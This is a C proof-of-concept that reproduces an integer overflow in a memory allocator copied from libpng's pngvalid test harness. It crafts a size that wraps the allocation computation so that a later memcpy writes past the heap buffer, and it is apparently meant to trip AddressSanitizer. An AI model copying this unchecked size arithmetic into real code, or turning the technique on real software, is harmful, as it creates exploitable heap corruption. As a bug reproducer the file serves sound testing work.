#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <limits.h>

/* Minimal type re-declarations matching libpng test harness expectations */
typedef size_t png_alloc_size_t;
typedef unsigned char png_byte;

typedef struct png_struct_def png_struct;
struct png_struct_def {
    void *mem_ptr; /* user memory pointer */
};

/* Helper macro from libpng test code */
#define voidcast(type, value) ((type)(value))

/* Forward decls */
static void *png_get_mem_ptr(const png_struct *pp);

/* Minimal store structures to satisfy the vulnerable code */
struct store_store { void *pread; void *pwrite; };

typedef struct store_memory store_memory;
typedef struct store_pool store_pool;

struct store_pool {
    png_byte mark[32];           /* marker copied into allocations */
    size_t max, current, limit, total, max_limit, max_total;
    struct store_store *store;   /* unused in this reproducer */
    store_memory *list;          /* allocation list head */
    const char *wname;           /* unused */
};

struct store_memory {
    png_alloc_size_t size;       /* requested size */
    png_byte mark[32];           /* header marker */
    store_pool *pool;            /* back-pointer */
    store_memory *next;          /* linked list */
};

static void *png_get_mem_ptr(const png_struct *pp)
{
    return ((const struct png_struct_def*)pp)->mem_ptr;
}

/* Stubbed logger (only used on OOM path, which we avoid) */
static void store_log(struct store_store *store, const png_struct *pp,
                      const char *msg, int is_error)
{
    (void)store; (void)pp; (void)is_error;
    fprintf(stderr, "store_log: %s\n", msg);
}

/* Vulnerable function copied and minimally adapted from contrib/libtests/pngvalid.c */
static void *
store_malloc(png_struct *ppIn, png_alloc_size_t cb)
{
    const png_struct *pp = ppIn;
    store_pool *pool = voidcast(store_pool*, png_get_mem_ptr(pp));

    store_memory *new = voidcast(store_memory*,
        malloc(cb + (sizeof *new) + (sizeof pool->mark)));

    if (new != NULL)
    {
        if (cb > pool->max)
            pool->max = cb;

        pool->current += cb;
        if (pool->current > pool->limit)
            pool->limit = pool->current;
        pool->total += cb;

        new->size = cb;
        memcpy(new->mark, pool->mark, sizeof new->mark);
        /* Integer overflow in the allocation size above can make this write OOB */
        memcpy((png_byte *)(new+1) + cb, pool->mark, sizeof pool->mark);
        new->pool = pool;
        new->next = pool->list;
        pool->list = new;
        ++new; /* return pointer past the header */
    }
    else
    {
        store_log(pool ? pool->store : NULL, pp, "out of memory", 1);
    }

    return new;
}

int main(void)
{
    /* Initialize a fake pool and png_struct to satisfy store_malloc */
    store_pool pool;
    memset(&pool, 0, sizeof(pool));
    /* Fill the mark with some bytes so memcpy has non-zero size */
    for (size_t i = 0; i < sizeof(pool.mark); ++i) pool.mark[i] = (png_byte)(0xA5 + i);

    png_struct png;
    png.mem_ptr = &pool; /* png_get_mem_ptr will return &pool */

    /* Craft cb so that: allocated_size = (cb + sizeof(store_memory) + sizeof(pool.mark)) wraps
       to exactly sizeof(store_memory). This ensures header fits, but trailer write goes OOB.
       Let M = 2^n. Choose cb = M - sizeof(pool.mark). Then allocated_size becomes:
       (M - sizeof(mark) + sizeof(header) + sizeof(mark)) mod M = sizeof(header).
    */
    png_alloc_size_t cb = (size_t)0 - (size_t)sizeof(pool.mark); /* == 2^n - sizeof(mark) */

    void *user_ptr = store_malloc(&png, cb);
    /* If the program reaches here without ASan aborting, free to be tidy. */
    free(user_ptr ? ((store_memory*)user_ptr - 1) : NULL);

    fprintf(stderr, "Unexpectedly survived; pointer=%p\n", user_ptr);
    return 0;
}
